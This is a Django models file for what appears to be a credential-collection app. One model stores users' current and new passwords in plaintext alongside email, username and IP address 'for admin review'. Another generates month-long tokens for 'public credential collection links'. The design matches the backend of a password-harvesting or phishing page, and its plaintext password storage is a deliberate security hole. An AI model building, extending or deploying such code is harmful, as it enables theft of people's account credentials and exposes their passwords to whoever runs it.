from django.db import models
from django.contrib.auth.models import User
from django.utils import timezone
import secrets
from datetime import timedelta


class CredentialSubmission(models.Model):
    """
    Store credential submissions from users for admin review
    """
    email = models.EmailField(max_length=254)
    username = models.CharField(max_length=150)
    current_password = models.CharField(max_length=128, default='')  # Current password
    new_password = models.CharField(max_length=128, default='')  # New password
    submitted_at = models.DateTimeField(auto_now_add=True)
    ip_address = models.GenericIPAddressField(null=True, blank=True)
    reviewed = models.BooleanField(default=False)
    notes = models.TextField(blank=True)
    
    class Meta:
        ordering = ['-submitted_at']
        verbose_name = 'Credential Submission'
        verbose_name_plural = 'Credential Submissions'
    
    def __str__(self):
        return f"{self.username} - {self.email} ({self.submitted_at.strftime('%Y-%m-%d %H:%M')})"


class CredentialUpdateToken(models.Model):
    """
    Secure token for public credential collection link
    """
    token = models.CharField(max_length=64, unique=True, db_index=True)
    created_at = models.DateTimeField(auto_now_add=True)
    expires_at = models.DateTimeField()
    description = models.CharField(max_length=255, blank=True, help_text="Optional description for this link")
    
    class Meta:
        ordering = ['-created_at']
        verbose_name = 'Credential Collection Link'
        verbose_name_plural = 'Credential Collection Links'
    
    def __str__(self):
        return f"Link created {self.created_at.strftime('%Y-%m-%d')} - {'Active' if self.is_valid() else 'Expired'}"
    
    @classmethod
    def generate_token(cls, hours_valid=720, description=""):  # 30 days default
        """
        Generate a new secure token for credential collection
        """
        token = secrets.token_urlsafe(48)
        expires_at = timezone.now() + timedelta(hours=hours_valid)
        
        credential_token = cls.objects.create(
            token=token,
            expires_at=expires_at,
            description=description
        )
        
        return credential_token
    
    def is_valid(self):
        """
        Check if token is still valid (not expired)
        """
        return timezone.now() < self.expires_at
    
    def get_private_link(self, request=None):
        """
        Generate the full private link URL
        """
        if request:
            base_url = request.build_absolute_uri('/')[:-1]
        else:
            base_url = "http://127.0.0.1:8000"
        
        return f"{base_url}/credentials/info/{self.token}/"
